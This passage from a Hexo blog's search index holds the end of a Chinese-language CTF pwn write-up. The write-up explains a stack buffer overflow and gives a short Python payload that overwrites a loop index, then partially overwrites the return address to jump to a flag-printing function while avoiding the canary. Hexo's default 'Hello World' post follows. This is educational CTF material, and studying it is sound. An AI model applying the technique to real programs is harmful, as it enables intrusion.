class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-0000000000000040                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003F                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003E                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003D                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003C                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003B                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000003A                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000039                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000038                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000037                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000036                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000035                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000034                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000033                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000032                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000031 buf             db ?</span><br><span class="hljs-deletion">-0000000000000030 var_30          db ?</span><br><span class="hljs-deletion">-000000000000002F                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002E                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002D                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002C                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002B                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000002A                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000029                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000028                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000027                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000026                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000025                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000024                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000023                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000022                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000021                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000020                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001F                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001E                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001D                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001C                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001B                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000001A                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000019                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000018                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000017                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000016                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000015                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000014                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000013                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000012                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000011                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000010                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000F                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000E                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000D                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000C                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000B                 db ? ; undefined</span><br><span class="hljs-deletion">-000000000000000A                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000009                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000008                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000007                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000006                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000005                 db ? ; undefined</span><br><span class="hljs-deletion">-0000000000000004 var_4           dd ?</span><br><span class="hljs-addition">+0000000000000000  s              db 8 dup(?)</span><br><span class="hljs-addition">+0000000000000008  r              db 8 dup(?)</span><br><span class="hljs-addition">+0000000000000010</span><br><span class="hljs-addition">+0000000000000010 ; end of stack variables</span><br></code></pre></td></tr></table></figure><code>buf</code> 和 <code>var_30</code> 占45字节，属于<code>buf[45]</code> , <code>var_4</code> 则是变量 <code>i</code></p><p>由此，可以有一种思路: 将 <code>buf</code> 溢出覆盖 <code>i</code>实现栈上任意写</p><p>构造payload: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">44</span>+<span class="hljs-string">b&#x27;\x37&#x27;</span>+<span class="hljs-string">b&#x27;\x42&#x27;</span><br></code></pre></td></tr></table></figure> 前44个a是垃圾占位字符，填充<code>-0000000000000030</code> 到 <code>-0000000000000005</code>(ps:因为 <code>-0000000000000031</code> 总是储存当前字符)</p><p>后面写一个 <code>0x37</code> , 即将 <code>i</code>改成55。这是考虑到for循环后要有 <code>i++</code> , 即下一次写入的地址是<code>buf[(i++)+1]</code> , 此地址即为 <code>buf[57]</code> =<code>-0x31+0x39=0x8</code> , 就是返回地址的第一个字节</p><p>下面解释payload最后一字节:</p><p>首先，地址随机化只是进行页的随机化，一页的大小是 <code>0x1000</code>, 也就是说同一页上地址的后三位不会改变。</p><p>其次，小端储存，是指以字节为单位，低数位储存在低地址，高数位储存在高地址。返回地址是<code>call    _sub_400acd</code> 指令的下一条，地址即<code>0x00000000000008D8</code> , 所以我们最后是将上述地址覆盖成<code>0x0000000000000842</code> , 这正是 <code>sub_40067d()</code>的地址。这样我们就把程序劫持到该函数上打印flag</p><p>PS: 由于金丝雀是在栈上变量之后， <code>rbp</code>和返回地址之前，我们可以通过数组索引避开金丝雀实现栈溢出，所以本题开了<code>canary</code> 也可以做</p>]]></content>
    
    
    <categories>
      
      <category>ctf_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/02/24/hello-world/"/>
    <url>/2024/02/24/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your veryfirst post. Check <a href="https://hexo.io/docs/">documentation</a> formore info. If you get any problems when using Hexo, you can find theanswer in <ahref="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> oryou can ask me on <ahref="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="test">Test</h3><p><span class="math display">\[E=mc^2\]</span></p><p><span class="math display">\[c =\mu \cdot \lambda\]</span></p><p><span class="math display">\[\begin{align*}    u_n(x,t)&amp;=sin(\dfrac{n\pi}{x_0}x) \left[A_ncos(\dfrac{n\piv}{x_0}t)+B_nsin(\dfrac{n\pi v}{x_0}t)\right] \\    &amp;=N_nsin(\dfrac{n\pi}{x_0}x)sin(\dfrac{n\pi v}{x_0}t+\phi _n)\end{align*}\]</span></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
